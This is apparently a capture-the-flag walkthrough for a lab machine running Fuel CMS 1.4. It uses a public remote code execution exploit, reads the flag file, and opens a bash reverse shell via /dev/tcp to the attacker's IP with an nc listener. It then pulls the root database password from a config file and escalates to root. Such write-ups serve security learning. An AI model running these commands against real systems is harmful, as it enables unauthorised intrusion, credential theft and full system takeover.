Visiting http://[machine IP]:80 shows us a Welcome to Fuel CMS
Version 1.4 default page.

Looking into an exploit for Fuel CMS, I found this: https://www.exploit-db.com/exploits/50477 - an RCE

Syntax: python3 50477.py -u http://[machine IP]

And we should see:
[+]Connecting...
Enter Command $

Success!

Although we are sort of stuck in the current directory, we can traverse with ls ../../.. etc. 

There is a robots.txt file, which says to exclude the /fuel/ webpage, which is a login. The credentials are just admin:admin, but accessing this doesn't lead to anything.

Checking the /home/ folder, the only user present is (oddly) named www-data. Here, we find the user flag.
cat ../../../home/www-data/flag.txt

To make this a bit easier, we can get a reverse shell by doing the following:

Start a listener on your machine with: nc -lvnp [port number]

RCE to the victim machine:
echo "bash -i >& /dev/tcp/[your tun0 ip]/[port number] 0>&1" > /tmp/shell.sh
bash /tmp/shell.sh

Next, we can upgrade the shell with python: 
python -c 'import pty; pty.spawn("/bin/bash")'

Poking around the config files in /var/www/html/fuel/application/config, catting out database.php reveals credentials at the very end:

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => '(xxx Redacted xxx)',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE

We can now login as root! Enter su root and enter the password ~ congrats!
